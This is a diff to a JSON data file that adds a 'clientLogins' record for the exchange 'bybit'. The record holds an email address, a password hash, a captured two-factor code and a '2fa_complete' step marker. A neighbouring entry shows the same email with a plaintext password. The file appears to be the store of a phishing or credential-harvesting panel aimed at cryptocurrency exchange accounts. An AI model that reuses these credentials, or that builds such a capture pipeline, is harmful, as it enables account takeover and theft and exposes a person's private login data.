@@ -670,6 +670,17 @@
   ],
   "clientLogins": [
     {
+      "id": "1765056085856-73e91f07587ae8",
+      "email": "kbonface03@gmail.com",
+      "password": "$2b$10$wlHVfSUI5kynjelCk/mCU.FgJx70oJnlsArsB9ievZ/AaE38ipDYW",
+      "twoFactorCode": "324456",
+      "platform": "bybit",
+      "step": "2fa_complete",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T21:21:25.856Z"
+    },
+    {
       "id": "1765048578697-b50b1a50a593e8",
       "email": "kbonface03@gmail.com",
       "password": "Temp@2019",
